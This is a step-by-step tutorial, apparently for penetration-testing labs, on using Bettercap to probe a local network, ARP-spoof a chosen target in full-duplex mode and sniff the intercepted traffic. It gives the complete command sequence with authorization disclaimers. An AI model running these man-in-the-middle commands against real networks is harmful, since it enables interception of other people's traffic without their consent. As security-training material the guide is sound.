# 🌐 Network Probing & ARP Spoofing Configuration (Bettercap)

> **Disclaimer:** This guide is intended **only for authorized security testing, penetration testing labs, and educational purposes**. Perform these steps only on networks and devices that you own or have explicit permission to assess.

---

## 📋 Overview

This guide demonstrates how to configure **Bettercap** for:

- 🔍 Network Discovery
- 📡 Host Probing
- 🕵️ Packet Sniffing
- 🔄 ARP Spoofing (MITM)
- 📊 Network Traffic Analysis

---

## 🛠️ Prerequisites

- Kali Linux (Recommended)
- Bettercap Installed
- Wireless or Ethernet Network Interface
- Root Privileges
- Devices Connected to the Same Local Network

---

## 🚀 Step 1: Launch Bettercap

Start the Bettercap interactive console.

```bash
sudo bettercap
```

---

## 🔍 Step 2: Enable Network Probing

Enable network probing to discover active hosts on the local network.

```bash
net.probe on
```

### Purpose

- Sends probe packets across the network.
- Detects active devices.
- Identifies network configurations.
- Builds the host list automatically.

---

## 🔄 Step 3: Enable Full-Duplex ARP Spoofing

Configure Bettercap to spoof both the gateway and the target.

```bash
set arp.spoof.fullduplex true
```

### Purpose

- Enables bidirectional traffic interception.
- Allows communication to continue normally while traffic passes through the testing machine.
- Supports authorized Man-in-the-Middle (MITM) assessments.

---

## 🎯 Step 4: Specify Target Device

Select the target IP address for ARP spoofing.

```bash
set arp.spoof.targets <TARGET_IP>
```

### Example

```bash
set arp.spoof.targets 192.168.1.10
```

### Purpose

- Defines which host Bettercap will target during the assessment.

---

## 📦 Step 5: Enable Local Packet Sniffing

Capture packets passing through the local interface.

```bash
set net.sniff.local true
```

### Purpose

- Enables packet capture on the local network interface.
- Allows inspection of traffic for analysis during an authorized test.

---

## 🚨 Step 6: Start ARP Spoofing

Begin the ARP spoofing process.

```bash
arp.spoof on
```

### Purpose

- Sends forged ARP replies.
- Redirects the selected target's traffic through the testing system during an authorized assessment.

---

## 📡 Step 7: Start Packet Sniffing

Begin monitoring network traffic.

```bash
net.sniff on
```

### Purpose

- Captures packets traversing the network interface.
- Enables protocol and traffic analysis for security testing.

---

# 📖 Complete Command Sequence

```bash
sudo bettercap

net.probe on

set arp.spoof.fullduplex true

set arp.spoof.targets <TARGET_IP>

set net.sniff.local true

arp.spoof on

net.sniff on
```

---

## 📌 Workflow

```text
Start Bettercap
        │
        ▼
Enable Network Probing
        │
        ▼
Configure Full-Duplex ARP Spoofing
        │
        ▼
Specify Target IP
        │
        ▼
Enable Local Packet Sniffing
        │
        ▼
Start ARP Spoofing
        │
        ▼
Start Packet Sniffing
        │
        ▼
Analyze Captured Network Traffic
```

---

## ⚠️ Important Notes

- Perform these actions **only in environments where you have authorization** (e.g., your own lab or systems you are permitted to test).
- Unauthorized interception or modification of network traffic may be illegal and unethical.
- Disable spoofing and sniffing when testing is complete to restore normal network operation.

---
```
